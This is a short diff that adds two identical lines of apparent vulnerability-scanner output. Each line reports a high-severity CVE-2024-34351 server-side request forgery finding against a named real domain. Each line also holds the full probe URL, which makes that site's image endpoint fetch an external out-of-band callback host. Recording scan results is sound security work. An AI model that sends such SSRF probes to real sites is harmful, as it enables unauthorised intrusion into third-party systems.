@@ -1,0 +1,2 @@
+[CVE-2024-34351] [http] [high] https://sandbox.spherepay.co/_next/image?w=16&q=10&url=https://d8qokfjomj13ef52ldigj6rs19x4ten6m.oast.online
+[CVE-2024-34351] [http] [high] https://sandbox.spherepay.co/_next/image?w=16&q=10&url=https://d8qokfjomj13ef52ldigj6rs19x4ten6m.oast.online
